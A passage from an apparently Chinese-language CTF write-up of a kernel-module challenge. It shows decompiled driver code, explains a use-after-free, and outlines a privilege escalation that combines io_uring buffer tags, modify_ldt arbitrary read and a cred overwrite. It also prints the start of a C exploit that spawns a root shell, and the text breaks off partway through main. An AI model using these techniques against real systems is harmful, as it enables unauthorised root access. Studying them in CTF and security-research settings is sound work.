class="line">            <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_10:</span><br><span class="line">        v9 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v10 = key_list[v9];</span><br><span class="line">          <span class="keyword">if</span> ( !v10 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">          *(_DWORD *)(v1 - <span class="number">0x3C</span>) = v9++;</span><br><span class="line">          v11 = <span class="built_in">strcmp</span>(v10, v5);</span><br><span class="line">          v12 = *(_DWORD *)(v1 - <span class="number">0x3C</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v11 );</span><br><span class="line">        <span class="keyword">if</span> ( v12 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          cur[<span class="number">2</span>] += v2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v12 &lt;= <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v12 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v12 == <span class="number">1</span> )</span><br><span class="line">              cur[<span class="number">1</span>] = <span class="string">&quot;lucky&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            kfree(*cur);</span><br><span class="line">            *cur = v2;</span><br><span class="line">            v2 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_18:</span><br><span class="line">        kfree(v2);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cur = a1-&gt;cur;</span><br><span class="line">  <span class="keyword">if</span> ( !cur )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是<code>change</code>函数，这道题唯一难逆向的地方就在这里，仔细看其实也挺简单的，就是进行字符串对比然后进入相应的分值，其中<code>kmemdup_nul</code>函数会分配一个堆块，所以这里就是首先<code>kfree</code>掉当前<code>context-&gt;cur[0]</code>然后将新分配的堆块放进去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">delMaind_0</span><span class="params">(Maind *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *cur; <span class="comment">// r14</span></span><br><span class="line">  _QWORD *prv; <span class="comment">// r13</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  printk(<span class="string">&quot;die\n&quot;</span>);</span><br><span class="line">  cur = context-&gt;cur;</span><br><span class="line">  prv = context-&gt;prv;</span><br><span class="line">  <span class="keyword">if</span> ( cur )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(*cur);</span><br><span class="line">    *cur = <span class="number">0LL</span>;</span><br><span class="line">    kfree(cur);</span><br><span class="line">    context-&gt;cur = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( prv )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(*prv);</span><br><span class="line">    *prv = <span class="number">0LL</span>;</span><br><span class="line">    kfree(prv);</span><br><span class="line">    context-&gt;prv = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  kfree(context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数其实也就是<code>hhoge_unlocked_ioctl_cold</code>，可以看到这里会<code>kfree</code>掉的东西很多。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">hhoge_read</span><span class="params">(file *file, <span class="keyword">char</span> *ubuf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *ppos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  Maind *private_data; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// r14</span></span><br><span class="line">  __int64 v7; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  private_data = (Maind *)file-&gt;private_data;</span><br><span class="line">  <span class="keyword">if</span> ( !private_data )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v6 = private_data-&gt;cur;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">9LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">9</span> )</span><br><span class="line">      v7 = v4;</span><br><span class="line">    _check_object_size(private_data-&gt;cur, v7, <span class="number">1LL</span>);</span><br><span class="line">    copy_to_user(ubuf, v6, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就是read函数，最多只允许读取9个字节的内容。可以很容易的看出来，这里可以直接读取到堆地址。</p><p>题目的漏洞很明显，如果我们使用<code>change_cold</code>函数分配一个堆块，那么此时这个堆块的地址在<code>context-&gt;cur[0]</code>中随后调用<code>reborn_0</code>函数，那么堆块地址在<code>context-&gt;prv[0]</code>中也存在了，那么如果我们再次调用<code>change_cold</code>函数的话，就会<code>kfree</code>调用<code>context-&gt;cur[0]</code>中的堆块，但是此时<code>context-&gt;prv[0]</code>指针仍然保存着目标堆块的地址，此时就形成了UAF。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>知道了io_uring以及上面的漏洞的话利用方式就很明显了，这里可以首先利用io_uring可以随意更新内容的机制以及read可以泄漏出堆地址配合<code>modify_ldt</code>实现任意地址读，在堆区中寻在<code>task_struct</code>结构体，进而获得<code>cred</code>地址。这里需要注意的是在新版本<code>task_struct</code>在这一片区域有一点小变化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="comment">/* Cached requested key. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * executable name, excluding path.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment"> * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment"> * - lock it with task_lock()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure><p>comm和cred中间新增了一个指针。</p><p>随后释放掉ldt结构体，让<code>ctx-&gt;buf_data-&gt;tag</code>也就是上面的<code>table</code>分配的大小为0x10，使<code>table</code>占据这个UAF的堆块。那我们可以通过ring0的<code>ctx-&gt;buf_data-&gt;tag[0]</code>也就是<code>table[0]</code>去修改ring1的<code>ctx-&gt;buf_data-&gt;tags</code>为<code>cred</code>地址，如果我们此时修改ring1的<code>ctx-&gt;buf_data-&gt;tag[0]</code>就可以修改到<code>cred</code>结构体了，完成了提权。</p><p>不熟悉上述提到的提权方式可以看一下这篇文章 <a href="https://cv196082.gitee.io/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/">kernel pwn内存任意读写提升权限[1]</a></p><p>不熟悉<code>modify_ldt</code>的可以看一下这篇文章 <a href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/">modify_ldt利用</a></p><h3 id="综上可得exp"><a href="#综上可得exp" class="headerlink" title="综上可得exp"></a>综上可得exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;liburing.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>, <span class="title">ring1</span>, <span class="title">ring2</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> entries;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_entries;</span><br><span class="line">    <span class="keyword">int</span> slot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_uring</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    io_uring_queue_init(<span class="number">2</span>, &amp;ring, <span class="number">0</span>);</span><br><span class="line">    io_uring_queue_init(<span class="number">2</span>, &amp;ring1, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_tag</span><span class="params">(struct io_uring *ring, <span class="keyword">size_t</span> *data, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tmp_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">vecs</span>[<span class="title">num</span>];</span></span><br><span class="line">    <span class="keyword">size_t</span> tags[num];</span><br><span class="line">    <span class="built_in">memcpy</span>(tags, data, num * <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        vecs[i].iov_base = tmp_buf;</span><br><span class="line">        vecs[i].iov_len = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> res = io_uring_register_buffers_tags(ring, vecs, tags, num);</span><br><span class="line">    <span class="keyword">if</span> (res &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="built_in">sprintf</span>(<span class="string">&quot;io_uring_register_buffers_tags %d\n&quot;</span>, res));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_tag</span><span class="params">(struct io_uring *ring, <span class="keyword">size_t</span> Data, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tmp_buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">vecs</span>[2];</span></span><br><span class="line">    vecs[<span class="number">0</span>].iov_base = tmp_buf;</span><br><span class="line">    vecs[<span class="number">0</span>].iov_len = <span class="number">1</span>;</span><br><span class="line">    vecs[<span class="number">1</span>].iov_base = tmp_buf;</span><br><span class="line">    vecs[<span class="number">1</span>].iov_len = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> ret = io_uring_register_buffers_update_tag(ring, <span class="number">0</span>, vecs, Data, num);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="built_in">sprintf</span>(<span class="string">&quot;io_uring_register_buffers_update_tag %d\n&quot;</span>, ret));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_32bit : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> contents : <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> read_exec_only : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit_in_pages : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_not_present : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> useable : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> lm : <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    signal(SIGINT, get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>] = &#123;<span 